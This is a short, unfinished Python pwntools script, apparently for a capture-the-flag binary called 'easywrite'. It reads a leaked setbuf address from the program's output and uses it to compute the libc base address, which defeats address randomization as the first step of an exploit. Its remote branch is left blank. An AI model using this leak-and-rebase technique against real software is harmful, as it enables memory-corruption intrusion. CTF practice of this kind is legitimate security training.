from pwn import *

debug = True

if (debug==True):
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./easywrite')
else:
    libc = ELF('')


leak = int(p.recv().split()[3].split(':')[1], 16)
print 'leak (setbuf): ', hex(leak)
libc.address = leak-libc.sym['setbuf']
print 'libc: ', hex(libc.address)
p.sendline('Hello im hacker')
print p.recv()
